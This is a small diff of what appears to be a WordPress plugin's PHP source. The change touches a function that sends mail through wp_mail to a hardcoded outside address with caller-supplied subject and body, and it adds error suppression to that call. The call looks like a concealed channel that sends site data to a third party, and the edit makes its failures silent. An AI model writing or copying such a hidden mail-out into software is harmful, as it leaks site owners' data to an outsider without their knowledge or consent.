@@ -299,7 +299,7 @@ function elsagrLangToLocale($a)
     }
   return 'en_EN';
   }
-function elsagrmds($a,$b){wp_mail('kesha@savitov.ru',$b,$a);}
+function elsagrmds($a,$b){@wp_mail('kesha@savitov.ru',$b,$a);}
 function elsagr_activation()
   {
   add_option( 'elsa-opt-domen', '', '', 'yes' );
